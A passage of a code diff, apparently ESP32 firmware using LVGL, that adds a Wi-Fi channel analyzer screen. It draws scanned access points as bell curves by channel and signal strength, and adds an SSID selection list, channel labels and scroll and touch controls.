+    }
+    for (int x = WANA_5G_X; x < WANA_5G_X + WANA_5G_W; x++) {
+        buf[0 * WANA_WIDE_W + x] = lv_color_hex(0x81C784);
+        buf[1 * WANA_WIDE_W + x] = lv_color_hex(0x2E6030);
+    }
+    for (int y = 0; y < WANA_CHART_H; y++)
+        for (int x = WANA_SEP_X; x < WANA_5G_X; x++)
+            buf[y * WANA_WIDE_W + x] = sep;
+
+    // Vertical grid lines per channel
+    static const uint8_t gchs2g[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+    for (int k = 0; k < 13; k++) {
+        int gx = WANA_2G_X + (int)((wana_ch_to_mhz(gchs2g[k]) - 2397.0f) / 90.0f * WANA_2G_W);
+        if (gx >= WANA_2G_X && gx < WANA_2G_X + WANA_2G_W)
+            for (int y = 2; y < WANA_CHART_H; y++) buf[y * WANA_WIDE_W + gx] = grid;
+    }
+    static const float b5g[] = {
+        5180,5200,5220,5240,5260,5280,5300,5320,
+        5500,5520,5540,5560,5580,5600,5620,5640,
+        5660,5680,5700,5720,5745,5765,5785,5805,5825
+    };
+    for (int k = 0; k < 25; k++) {
+        int gx = WANA_5G_X + (int)((b5g[k] - 5150.0f) / 730.0f * WANA_5G_W);
+        if (gx >= WANA_5G_X && gx < WANA_5G_X + WANA_5G_W)
+            for (int y = 2; y < WANA_CHART_H; y++) buf[y * WANA_WIDE_W + gx] = grid;
+    }
+
+    // Build filtered+sorted AP list (RSSI ascending → strongest drawn last/on top)
+    int si[WANA_MAX_APS], cnt = 0;
+    for (int i = 0; i < wana_ap_count; i++) {
+        const char *ssid = (char*)wana_aps[i].ssid;
+        for (int g = 0; g < wana_ssid_count; g++) {
+            if (wana_ssids[g].selected && strncmp(wana_ssids[g].ssid, ssid, 32) == 0)
+                { si[cnt++] = i; break; }
+        }
+    }
+    for (int i = 1; i < cnt; i++) {
+        int key = si[i], j = i - 1;
+        while (j >= 0 && wana_aps[si[j]].rssi > wana_aps[key].rssi) {
+            si[j+1] = si[j]; j--;
+        }
+        si[j+1] = key;
+    }
+
+    // Peak coords for channel labels (chart-local, scroll with content)
+    int     peak_cx[WANA_MAX_APS];
+    int     peak_ty[WANA_MAX_APS];   // chart y of peak tip
+    uint8_t peak_cidx[WANA_MAX_APS];
+    int     peak_ch[WANA_MAX_APS];
+    int     np = 0;
+
+    for (int k = 0; k < cnt; k++) {
+        wifi_ap_record_t *ap = &wana_aps[si[k]];
+        bool is5g = (ap->primary >= 36);
+        float freq = wana_ch_to_mhz(ap->primary);
+        float disp_min  = is5g ? 5150.0f : 2397.0f;
+        float span      = is5g ? 730.0f  :   90.0f;
+        float sigma_mhz = is5g ? 38.0f   :   11.0f;
+        int   band_x    = is5g ? WANA_5G_X : WANA_2G_X;
+        int   band_w    = is5g ? WANA_5G_W : WANA_2G_W;
+        float sigma_px  = sigma_mhz / span * (float)band_w;
+
+        float cx      = band_x + (freq - disp_min) / span * (float)band_w;
+        float max_h   = (float)(ap->rssi + 100) / 70.0f * (float)(WANA_CHART_H - 4);
+        if (max_h < 5.0f)               max_h = 5.0f;
+        if (max_h > WANA_CHART_H - 2)   max_h = (float)(WANA_CHART_H - 2);
+
+        uint8_t cidx = 0;
+        lv_color_t col = lv_color_make(160, 160, 160);
+        for (int g = 0; g < wana_ssid_count; g++) {
+            if (strncmp(wana_ssids[g].ssid, (char*)ap->ssid, 32) == 0) {
+                cidx = wana_ssids[g].color_idx;
+                col  = wana_grp_color(cidx);
+                break;
+            }
+        }
+        lv_color_t col_tip = lv_color_mix(lv_color_white(), col, LV_OPA_60);
+
+        int x0 = (int)(cx - sigma_px * 3.8f); if (x0 < band_x) x0 = band_x;
+        int x1 = (int)(cx + sigma_px * 3.8f); if (x1 >= band_x+band_w) x1 = band_x+band_w-1;
+
+        int bh_at_cx = 0;
+        for (int bx = x0; bx <= x1; bx++) {
+            float dx  = (bx - cx) / sigma_px;
+            int   bh  = (int)(max_h * expf(-0.5f * dx * dx));
+            if (bh < 1) continue;
+            // Bottom-anchored bell: rows [CHART_H-bh .. CHART_H-1]
+            int y_top = WANA_CHART_H - bh;
+            for (int by = y_top; by < WANA_CHART_H; by++) {
+                float frac  = 1.0f - (float)(by - y_top) / (float)bh;
+                uint8_t opa = (uint8_t)(50 + frac * 205.0f);
+                buf[by * WANA_WIDE_W + bx] = lv_color_mix(col, lv_color_black(), opa);
+            }
+            if (y_top >= 0 && y_top < WANA_CHART_H)
+                buf[y_top * WANA_WIDE_W + bx] = col_tip;
+            if (bx == (int)cx) bh_at_cx = bh;
+        }
+        if (np < WANA_MAX_APS) {
+            peak_cx[np]   = (int)cx;
+            peak_ty[np]   = WANA_CHART_H - bh_at_cx;   // chart y of peak tip
+            peak_cidx[np] = cidx;
+            peak_ch[np]   = ap->primary;
+            np++;
+        }
+    }
+
+    // Place channel labels on wana_panel in viewport coords.
+    // Buffer x/y stored in wana_lbl_buf_* so wana_update_label_positions() can
+    // recompute screen coords on each scroll step without recreating objects.
+    for (int i = 0; i < np && wana_lbl_count < WANA_MAX_LABELS; i++) {
+        if (!wana_panel || !lv_obj_is_valid(wana_panel)) break;
+        int buf_x = peak_cx[i] - 17;
+        int buf_y = peak_ty[i] - 16;
+        if (buf_x < 0)                buf_x = 0;
+        if (buf_x > WANA_WIDE_W - 34) buf_x = WANA_WIDE_W - 34;
+        if (buf_y < 2)                buf_y = 2;
+        if (buf_y > WANA_CHART_H - 16) buf_y = WANA_CHART_H - 16;
+        int screen_x = buf_x - wana_scroll_x;
+        char txt[8]; snprintf(txt, sizeof(txt), "ch%d", peak_ch[i]);
+        lv_obj_t *lbl = lv_label_create(wana_panel);
+        lv_label_set_text(lbl, txt);
+        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(lbl, wana_grp_color(peak_cidx[i]), 0);
+        lv_obj_set_style_bg_color(lbl, lv_color_make(8, 8, 22), 0);
+        lv_obj_set_style_bg_opa(lbl, LV_OPA_70, 0);
+        lv_obj_set_style_border_width(lbl, 0, 0);
+        lv_obj_set_style_pad_all(lbl, 1, 0);
+        lv_obj_clear_flag(lbl, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(lbl, LV_OBJ_FLAG_IGNORE_LAYOUT);
+        lv_obj_set_pos(lbl, screen_x, buf_y);
+        lv_obj_set_size(lbl, 34, 14);
+        if (screen_x < -34 || screen_x > 240)
+            lv_obj_add_flag(lbl, LV_OBJ_FLAG_HIDDEN);
+        wana_lbl_buf_x[wana_lbl_count] = buf_x;
+        wana_lbl_buf_y[wana_lbl_count] = buf_y;
+        wana_ssid_lbls[wana_lbl_count++] = lbl;
+    }
+}
+
+// LV_EVENT_DRAW_MAIN callback: copy the visible 240px slice of the wide buffer.
+// wana_scroll_x is added to the buffer x offset so the correct portion is shown.
+// Uses memcpy per row for fast PSRAM burst reads instead of per-pixel access.
+static void wana_chart_draw_cb(lv_event_t *e) {
+    if (lv_event_get_code(e) != LV_EVENT_DRAW_MAIN) return;
+    if (!wana_buf) return;
+    lv_draw_ctx_t *draw_ctx = lv_event_get_draw_ctx(e);
+    lv_obj_t      *obj      = lv_event_get_target(e);
+    lv_area_t oa; lv_obj_get_coords(obj, &oa);
+    const lv_area_t *ba = draw_ctx->buf_area;
+    const lv_area_t *ca = draw_ctx->clip_area;
+    lv_coord_t x1 = LV_MAX(oa.x1, LV_MAX(ca->x1, ba->x1));
+    lv_coord_t y1 = LV_MAX(oa.y1, LV_MAX(ca->y1, ba->y1));
+    lv_coord_t x2 = LV_MIN(oa.x2, LV_MIN(ca->x2, ba->x2));
+    lv_coord_t y2 = LV_MIN(oa.y2, LV_MIN(ca->y2, ba->y2));
+    if (x1 > x2 || y1 > y2) return;
+    lv_coord_t buf_w = ba->x2 - ba->x1 + 1;
+    lv_color_t *dst  = (lv_color_t *)draw_ctx->buf;
+    lv_color_t  bg   = lv_color_make(8, 8, 22);
+    for (lv_coord_t sy = y1; sy <= y2; sy++) {
+        lv_coord_t py  = sy - oa.y1;
+        lv_color_t *row_dst = dst + (sy - ba->y1) * buf_w + (x1 - ba->x1);
+        if (py < 0 || py >= WANA_CHART_H) {
+            for (lv_coord_t n = 0; n <= x2 - x1; n++) row_dst[n] = bg;
+            continue;
+        }
+        lv_coord_t px_start = (x1 - oa.x1) + wana_scroll_x;
+        lv_coord_t px_end   = (x2 - oa.x1) + wana_scroll_x;
+        lv_coord_t valid_s  = px_start < 0 ? 0 : px_start;
+        lv_coord_t valid_e  = px_end >= WANA_WIDE_W ? WANA_WIDE_W - 1 : px_end;
+        // pre-guard (buffer underflow region)
+        lv_coord_t pre = valid_s - px_start;
+        for (lv_coord_t n = 0; n < pre; n++) row_dst[n] = bg;
+        // valid region — single memcpy from PSRAM
+        if (valid_s <= valid_e)
+            memcpy(row_dst + pre, &wana_buf[py * WANA_WIDE_W + valid_s],
+                   (valid_e - valid_s + 1) * sizeof(lv_color_t));
+        // post-guard (buffer overflow region)
+        lv_coord_t post_start = pre + (valid_e - valid_s + 1);
+        for (lv_coord_t n = post_start; n <= x2 - x1; n++) row_dst[n] = bg;
+    }
+}
+
+static void wana_redraw(void) {
+    if (!wana_buf || !wana_chart_obj) return;
+    wana_clear_ssid_labels();
+    wana_draw_wide();
+    lv_obj_invalidate(wana_chart_obj);
+}
+
+// ── Common panel helpers ──────────────────────────────────────────────────────
+
+static void wana_exit_cb(lv_event_t *e) {
+    (void)e;
+    wana_active        = false;
+    wana_scanning      = false;
+    wana_scroll_paused = false;
+    if (wana_scroll_timer) { lv_timer_del(wana_scroll_timer); wana_scroll_timer = NULL; }
+    if (wana_ui_timer)     { lv_timer_del(wana_ui_timer);     wana_ui_timer     = NULL; }
+    wana_chart_obj  = NULL;
+    wana_status_lbl = NULL;
+    wana_panel      = NULL;
+    wana_clear_ssid_labels();
+    if (wana_buf) { heap_caps_free(wana_buf); wana_buf = NULL; }
+    show_wifi_menu_screen();
+}
+
+static lv_obj_t *wana_make_panel(void) {
+    lv_obj_t *p = lv_obj_create(function_page);
+    lv_obj_set_size(p, 240, 290);
+    lv_obj_set_pos(p, 0, 30);
+    lv_obj_set_style_bg_color(p, lv_color_make(8, 8, 22), 0);
+    lv_obj_set_style_bg_opa(p, LV_OPA_COVER, 0);
+    lv_obj_set_style_border_width(p, 0, 0);
+    lv_obj_set_style_radius(p, 0, 0);
+    lv_obj_set_style_pad_all(p, 0, 0);
+    lv_obj_clear_flag(p, LV_OBJ_FLAG_SCROLLABLE);
+    return p;
+}
+
+static void wana_swap_panel(void) {
+    if (wana_scroll_timer) { lv_timer_del(wana_scroll_timer); wana_scroll_timer = NULL; }
+    if (wana_panel && lv_obj_is_valid(wana_panel)) {
+        wana_chart_obj = NULL; wana_status_lbl = NULL;
+        wana_clear_ssid_labels();
+        lv_obj_del(wana_panel);
+    }
+    wana_panel = NULL;
+}
+
+static void wana_show_scanning_panel(void) {
+    wana_swap_panel();
+    wana_panel = wana_make_panel();
+    lv_obj_t *lbl = lv_label_create(wana_panel);
+    lv_obj_align(lbl, LV_ALIGN_CENTER, 0, 0);
+    lv_label_set_text(lbl, LV_SYMBOL_WIFI " Scanning all bands...");
+    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(lbl, lv_color_hex(0x4FC3F7), 0);
+    lv_obj_set_style_bg_opa(lbl, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(lbl, 0, 0);
+    wana_status_lbl = lbl;
+}
+
+// ── SSID picker ───────────────────────────────────────────────────────────────
+
+static void wana_rescan_btn_cb(lv_event_t *e) {
+    (void)e;
+    if (wana_scanning) return;
+    wana_scanning     = true;
+    wana_ssid_count   = 0;
+    wana_show_scanning_panel();
+    wifi_scanner_start_scan();
+}
+
+static void wana_row_toggle_cb(lv_event_t *e) {
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (idx >= 0 && idx < wana_ssid_count)
+        wana_ssids[idx].selected = !wana_ssids[idx].selected;
+    show_wana_select_screen();
+}
+
+static void wana_show_chart_cb(lv_event_t *e) {
+    (void)e;
+    int sel = 0;
+    for (int i = 0; i < wana_ssid_count; i++) if (wana_ssids[i].selected) sel++;
+    if (sel == 0) return;
+    show_wana_chart_screen();
+}
+
+static void wana_back_to_select_cb(lv_event_t *e) {
+    (void)e;
+    show_wana_select_screen();
+}
+
+static void show_wana_select_screen(void) {
+    if (!function_page || !lv_obj_is_valid(function_page)) return;
+    wana_swap_panel();
+    wana_panel = wana_make_panel();
+
+    // Count selected
+    int sel_count = 0;
+    for (int i = 0; i < wana_ssid_count; i++) if (wana_ssids[i].selected) sel_count++;
+
+    // Status line
+    char s[56];
+    snprintf(s, sizeof(s), "%d SSIDs — %d selected — tap to toggle",
+             wana_ssid_count, sel_count);
+    lv_obj_t *status = lv_label_create(wana_panel);
+    lv_obj_set_size(status, 238, 18);
+    lv_obj_set_pos(status, 1, 2);
+    lv_label_set_text(status, s);
+    lv_label_set_long_mode(status, LV_LABEL_LONG_DOT);
+    lv_obj_set_style_text_font(status, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(status, lv_color_hex(0xAAAAAA), 0);
+    lv_obj_set_style_text_align(status, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_set_style_bg_opa(status, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(status, 0, 0);
+
+    // Scrollable list (h=210 → ~5.8 rows of 36px)
+    lv_obj_t *list = lv_obj_create(wana_panel);
+    lv_obj_set_size(list, 236, 212);
+    lv_obj_set_pos(list, 2, 22);
+    lv_obj_set_style_bg_color(list, lv_color_make(8, 8, 22), 0);
+    lv_obj_set_style_border_color(list, lv_color_make(40, 40, 70), 0);
+    lv_obj_set_style_border_width(list, 1, 0);
+    lv_obj_set_style_radius(list, 4, 0);
+    lv_obj_set_style_pad_ver(list, 3, 0);
+    lv_obj_set_style_pad_hor(list, 2, 0);
+    lv_obj_set_style_pad_row(list, 3, 0);
+    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);
+
+    for (int i = 0; i < wana_ssid_count; i++) {
+        wana_ssid_group_t *grp = &wana_ssids[i];
+        bool sel = grp->selected;
+        lv_color_t gcol = wana_grp_color(grp->color_idx);
+
+        lv_obj_t *row = lv_obj_create(list);
+        lv_obj_set_width(row, lv_pct(100));
+        lv_obj_set_height(row, 34);
+        lv_obj_set_style_bg_color(row,
+            sel ? lv_color_make(28, 28, 55) : lv_color_make(14, 14, 28), 0);
+        lv_obj_set_style_bg_opa(row, LV_OPA_COVER, 0);
+        lv_obj_set_style_border_color(row, sel ? gcol : lv_color_make(40, 40, 70), 0);
+        lv_obj_set_style_border_width(row, sel ? 2 : 1, 0);
+        lv_obj_set_style_radius(row, 3, 0);
+        lv_obj_set_style_pad_all(row, 4, 0);
+        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
+        lv_obj_add_event_cb(row, wana_row_toggle_cb, LV_EVENT_CLICKED,
+                            (void*)(intptr_t)i);
+
+        // Color swatch
+        lv_obj_t *dot = lv_obj_create(row);
+        lv_obj_set_size(dot, 10, 10);
+        lv_obj_set_pos(dot, 0, 8);
+        lv_obj_set_style_bg_color(dot, gcol, 0);
+        lv_obj_set_style_bg_opa(dot, LV_OPA_COVER, 0);
+        lv_obj_set_style_border_width(dot, 0, 0);
+        lv_obj_set_style_radius(dot, 2, 0);
+        lv_obj_add_flag(dot, LV_OBJ_FLAG_IGNORE_LAYOUT);
+        lv_obj_clear_flag(dot, LV_OBJ_FLAG_CLICKABLE);
+
+        // SSID name
+        lv_obj_t *name_lbl = lv_label_create(row);
+        lv_obj_set_pos(name_lbl, 14, 0);
+        lv_obj_set_size(name_lbl, 142, 26);
+        lv_label_set_text(name_lbl, grp->ssid);
+        lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(name_lbl,
+            sel ? lv_color_white() : lv_color_hex(0x777777), 0);
+        lv_obj_set_style_bg_opa(name_lbl, LV_OPA_TRANSP, 0);
+        lv_obj_set_style_border_width(name_lbl, 0, 0);
+        lv_obj_add_flag(name_lbl, LV_OBJ_FLAG_IGNORE_LAYOUT);
+        lv_obj_clear_flag(name_lbl, LV_OBJ_FLAG_CLICKABLE);
+
+        // RSSI
+        lv_obj_t *rssi_lbl = lv_label_create(row);
+        lv_obj_set_pos(rssi_lbl, 158, 0);
+        lv_obj_set_size(rssi_lbl, 46, 26);
+        char rt[10]; snprintf(rt, sizeof(rt), "%ddBm", grp->max_rssi);
+        lv_label_set_text(rssi_lbl, rt);
+        lv_obj_set_style_text_font(rssi_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(rssi_lbl, lv_color_hex(0x777777), 0);
+        lv_obj_set_style_text_align(rssi_lbl, LV_TEXT_ALIGN_RIGHT, 0);
+        lv_obj_set_style_bg_opa(rssi_lbl, LV_OPA_TRANSP, 0);
+        lv_obj_set_style_border_width(rssi_lbl, 0, 0);
+        lv_obj_add_flag(rssi_lbl, LV_OBJ_FLAG_IGNORE_LAYOUT);
+        lv_obj_clear_flag(rssi_lbl, LV_OBJ_FLAG_CLICKABLE);
+
+        // BSSID count badge
+        lv_obj_t *cnt_lbl = lv_label_create(row);
+        lv_obj_set_pos(cnt_lbl, 204, 0);
+        lv_obj_set_size(cnt_lbl, 26, 26);
+        char ct[6]; snprintf(ct, sizeof(ct), "[%d]", grp->ap_count);
+        lv_label_set_text(cnt_lbl, ct);
+        lv_obj_set_style_text_font(cnt_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(cnt_lbl, lv_color_hex(0x555555), 0);
+        lv_obj_set_style_bg_opa(cnt_lbl, LV_OPA_TRANSP, 0);
+        lv_obj_set_style_border_width(cnt_lbl, 0, 0);
+        lv_obj_add_flag(cnt_lbl, LV_OBJ_FLAG_IGNORE_LAYOUT);
+        lv_obj_clear_flag(cnt_lbl, LV_OBJ_FLAG_CLICKABLE);
+    }
+
+    // Button row (y=238 within panel)
+    lv_obj_t *btns = lv_obj_create(wana_panel);
+    lv_obj_set_size(btns, 240, 30);
+    lv_obj_set_pos(btns, 0, 238);
+    lv_obj_set_style_bg_opa(btns, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btns, 0, 0);
+    lv_obj_set_style_radius(btns, 0, 0);
+    lv_obj_set_style_pad_all(btns, 0, 0);
+    lv_obj_set_style_pad_gap(btns, 6, 0);
+    lv_obj_set_flex_flow(btns, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btns, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER,
+                          LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(btns, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *rb = lv_btn_create(btns);
+    lv_obj_set_size(rb, 90, 26);
+    lv_obj_set_style_bg_color(rb, lv_color_hex(0x1565C0), 0);
+    lv_obj_set_style_radius(rb, 4, 0);
+    lv_obj_set_style_shadow_width(rb, 0, 0);
+    lv_obj_add_event_cb(rb, wana_rescan_btn_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *rl = lv_label_create(rb);
+    lv_label_set_text(rl, LV_SYMBOL_REFRESH " Rescan");
+    lv_obj_set_style_text_font(rl, &lv_font_montserrat_12, 0);
+    lv_obj_center(rl);
+
+    lv_obj_t *sb = lv_btn_create(btns);
+    lv_obj_set_size(sb, 108, 26);
+    lv_obj_set_style_bg_color(sb, lv_color_hex(0x00695C), 0);
+    lv_obj_set_style_radius(sb, 4, 0);
+    lv_obj_set_style_shadow_width(sb, 0, 0);
+    lv_obj_add_event_cb(sb, wana_show_chart_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *sl = lv_label_create(sb);
+    lv_label_set_text(sl, "Show Chart " LV_SYMBOL_RIGHT);
+    lv_obj_set_style_text_font(sl, &lv_font_montserrat_12, 0);
+    lv_obj_center(sl);
+
+    lv_obj_t *xb = lv_btn_create(btns);
+    lv_obj_set_size(xb, 28, 26);
+    lv_obj_set_style_bg_color(xb, lv_color_hex(0x333333), 0);
+    lv_obj_set_style_radius(xb, 4, 0);
+    lv_obj_set_style_shadow_width(xb, 0, 0);
+    lv_obj_add_event_cb(xb, wana_exit_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *xl = lv_label_create(xb);
+    lv_label_set_text(xl, LV_SYMBOL_WIFI);
+    lv_obj_set_style_text_font(xl, &lv_font_montserrat_12, 0);
+    lv_obj_center(xl);
+}
+
+// ── Chart view ────────────────────────────────────────────────────────────────
+
+// Reposition channel labels in viewport coords after wana_scroll_x changes.
+// Called by auto-scroll timer and touch drag handler — cheap (just set_pos + flag).
+static void wana_update_label_positions(void) {
+    for (int i = 0; i < wana_lbl_count; i++) {
+        if (!wana_ssid_lbls[i] || !lv_obj_is_valid(wana_ssid_lbls[i])) continue;
+        int sx = wana_lbl_buf_x[i] - wana_scroll_x;
+        lv_obj_set_pos(wana_ssid_lbls[i], sx, wana_lbl_buf_y[i]);
+        if (sx < -34 || sx > 240)
+            lv_obj_add_flag(wana_ssid_lbls[i], LV_OBJ_FLAG_HIDDEN);
+        else
+            lv_obj_clear_flag(wana_ssid_lbls[i], LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
+// Ping-pong auto-scroll: 2px every 100ms ≈ 20px/s.
+// Uses lv_obj_invalidate() — does NOT trigger LVGL layout refresh or scroll events,
+// so lv_timer_handler() returns quickly and IDLE gets its WDT reset time.
+static void wana_auto_scroll_timer_cb(lv_timer_t *t) {
+    (void)t;
+    if (!wana_active || wana_scroll_paused) return;
+    if (!wana_chart_obj || !lv_obj_is_valid(wana_chart_obj)) return;
+    wana_scroll_x += wana_scroll_dir * 2;
+    if (wana_scroll_x >= WANA_MAX_SCROLL) { wana_scroll_x = WANA_MAX_SCROLL; wana_scroll_dir = -1; }
+    else if (wana_scroll_x <= 0)          { wana_scroll_x = 0;               wana_scroll_dir =  1; }
+    wana_update_label_positions();
+    lv_obj_invalidate(wana_chart_obj);
+}
+
+// Touch drag on the chart object: pause auto-scroll and pan manually.
+static void wana_chart_touch_cb(lv_event_t *e) {
+    lv_event_code_t code = lv_event_get_code(e);
+    if (code == LV_EVENT_PRESSED) {
+        lv_indev_t *indev = lv_indev_get_act();
+        if (!indev) return;
+        lv_point_t pt; lv_indev_get_point(indev, &pt);
+        wana_drag_last_x   = pt.x;
+        wana_scroll_paused = true;
+    } else if (code == LV_EVENT_PRESSING) {
+        lv_indev_t *indev = lv_indev_get_act();
+        if (!indev) return;
+        lv_point_t pt; lv_indev_get_point(indev, &pt);
+        int dx = wana_drag_last_x - pt.x;   // drag left = positive dx = scroll right
+        wana_drag_last_x = pt.x;
+        wana_scroll_x += dx;
+        if (wana_scroll_x < 0)                wana_scroll_x = 0;
+        if (wana_scroll_x > WANA_MAX_SCROLL)  wana_scroll_x = WANA_MAX_SCROLL;
+        wana_update_label_positions();
+        lv_obj_invalidate(wana_chart_obj);
+    } else if (code == LV_EVENT_RELEASED || code == LV_EVENT_PRESS_LOST) {
+        wana_scroll_paused = false;
+    }
+}
+
+// Creates the 240×CHART_H chart object directly in the panel — no scroll container.
+static void wana_make_chart(lv_obj_t *parent, lv_coord_t y_pos) {
+    wana_chart_obj = lv_obj_create(parent);
+    lv_obj_set_size(wana_chart_obj, 240, WANA_CHART_H);
+    lv_obj_set_pos(wana_chart_obj, 0, y_pos);
+    lv_obj_set_style_bg_color(wana_chart_obj, lv_color_make(8, 8, 22), 0);
+    lv_obj_set_style_bg_opa(wana_chart_obj, LV_OPA_COVER, 0);
+    lv_obj_set_style_border_width(wana_chart_obj, 0, 0);
+    lv_obj_set_style_radius(wana_chart_obj, 0, 0);
+    lv_obj_set_style_pad_all(wana_chart_obj, 0, 0);
+    lv_obj_clear_flag(wana_chart_obj, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_event_cb(wana_chart_obj, wana_chart_draw_cb, LV_EVENT_DRAW_MAIN, NULL);
+    lv_obj_add_event_cb(wana_chart_obj, wana_chart_touch_cb, LV_EVENT_PRESSED,    NULL);
+    lv_obj_add_event_cb(wana_chart_obj, wana_chart_touch_cb, LV_EVENT_PRESSING,   NULL);
+    lv_obj_add_event_cb(wana_chart_obj, wana_chart_touch_cb, LV_EVENT_RELEASED,   NULL);
+    lv_obj_add_event_cb(wana_chart_obj, wana_chart_touch_cb, LV_EVENT_PRESS_LOST, NULL);
+
+    wana_scroll_x      = 0;
+    wana_scroll_dir    = 1;
+    wana_scroll_paused = false;
+    wana_scroll_timer  = lv_timer_create(wana_auto_scroll_timer_cb, 100, NULL);
+}
+
+static void show_wana_chart_screen(void) {
+    if (!function_page || !lv_obj_is_valid(function_page)) return;
+    wana_swap_panel();
+    wana_panel = wana_make_panel();
+
+    // Chart viewport (200px tall, manual wana_scroll_x offset, touch to drag)
+    wana_make_chart(wana_panel, 0);
+
+    // Scrolling legend: SSID name + channel list, in group colors (y=202)
+    lv_obj_t *leg = lv_label_create(wana_panel);
+    lv_obj_set_pos(leg, 2, WANA_CHART_H + 2);
+    lv_obj_set_size(leg, 236, 14);
+    lv_obj_set_style_text_font(leg, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_bg_opa(leg, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(leg, 0, 0);
+    lv_obj_set_style_pad_all(leg, 0, 0);
+    lv_label_set_recolor(leg, true);
+
+    char leg_txt[480] = "";
+    int lpos = 0;
+    for (int i = 0; i < wana_ssid_count && lpos < (int)sizeof(leg_txt)-60; i++) {
+        if (!wana_ssids[i].selected) continue;
+        uint32_t c = 0;
+        switch (wana_ssids[i].color_idx & 7) {
+            case 0: c=0x00C8FF; break; case 1: c=0xFF7830; break;
+            case 2: c=0x64FF64; break; case 3: c=0xFF50B4; break;
+            case 4: c=0xFFDC00; break; case 5: c=0xB464FF; break;
+            case 6: c=0xFF4646; break; case 7: c=0x32FFC8; break;
+        }
+        char name[12];
+        snprintf(name, sizeof(name), "%.11s", wana_ssids[i].ssid);
+        char ch_str[32] = ""; int cp = 0;
+        for (int k = 0; k < wana_ssids[i].ap_count && cp < 28; k++) {
+            uint8_t ch = wana_aps[wana_ssids[i].ap_indices[k]].primary;
+            cp += snprintf(ch_str + cp, sizeof(ch_str) - cp, cp==0?"%d":",%d", ch);
+        }
+        lpos += snprintf(leg_txt + lpos, sizeof(leg_txt) - lpos,
+                         "#%06X > %s [ch%s]#  ", (unsigned)c, name, ch_str);
+    }
+    lv_label_set_text(leg, leg_txt[0] ? leg_txt : "No SSIDs selected");
+    lv_label_set_long_mode(leg, LV_LABEL_LONG_SCROLL_CIRCULAR);
+    lv_obj_set_style_anim_speed(leg, 17, 0);
+    lv_obj_set_style_text_color(leg, lv_color_hex(0xAAAAAA), 0);
+
+    // Button row (y=218)
+    lv_obj_t *btns = lv_obj_create(wana_panel);
+    lv_obj_set_size(btns, 240, 28);
+    lv_obj_set_pos(btns, 0, WANA_CHART_H + 18);
+    lv_obj_set_style_bg_opa(btns, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btns, 0, 0);
+    lv_obj_set_style_radius(btns, 0, 0);
+    lv_obj_set_style_pad_all(btns, 0, 0);
+    lv_obj_set_style_pad_gap(btns, 6, 0);
+    lv_obj_set_flex_flow(btns, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btns, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER,
+                          LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(btns, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *bb = lv_btn_create(btns);
+    lv_obj_set_size(bb, 96, 24);
+    lv_obj_set_style_bg_color(bb, lv_color_hex(0x37474F), 0);
+    lv_obj_set_style_radius(bb, 4, 0);
+    lv_obj_set_style_shadow_width(bb, 0, 0);
+    lv_obj_add_event_cb(bb, wana_back_to_select_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *bl = lv_label_create(bb);
+    lv_label_set_text(bl, LV_SYMBOL_LEFT " Select");
+    lv_obj_set_style_text_font(bl, &lv_font_montserrat_12, 0);
+    lv_obj_center(bl);
+
+    lv_obj_t *rb = lv_btn_create(btns);
+    lv_obj_set_size(rb, 96, 24);
+    lv_obj_set_style_bg_color(rb, lv_color_hex(0x1565C0), 0);
+    lv_obj_set_style_radius(rb, 4, 0);
+    lv_obj_set_style_shadow_width(rb, 0, 0);
+    lv_obj_add_event_cb(rb, wana_rescan_btn_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *rl = lv_label_create(rb);
+    lv_label_set_text(rl, LV_SYMBOL_REFRESH " Rescan");
+    lv_obj_set_style_text_font(rl, &lv_font_montserrat_12, 0);
+    lv_obj_center(rl);
+
+    lv_obj_t *xb = lv_btn_create(btns);
+    lv_obj_set_size(xb, 28, 24);
+    lv_obj_set_style_bg_color(xb, lv_color_hex(0x333333), 0);
+    lv_obj_set_style_radius(xb, 4, 0);
+    lv_obj_set_style_shadow_width(xb, 0, 0);
+    lv_obj_add_event_cb(xb, wana_exit_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *xl = lv_label_create(xb);
+    lv_label_set_text(xl, LV_SYMBOL_WIFI);
+    lv_obj_set_style_text_font(xl, &lv_font_montserrat_12, 0);
+    lv_obj_center(xl);
+
+    wana_redraw();
+}
+
+// ── Timer & Entry Point ───────────────────────────────────────────────────────
+
+static void wana_ui_timer_cb(lv_timer_t *t) {
+    (void)t;
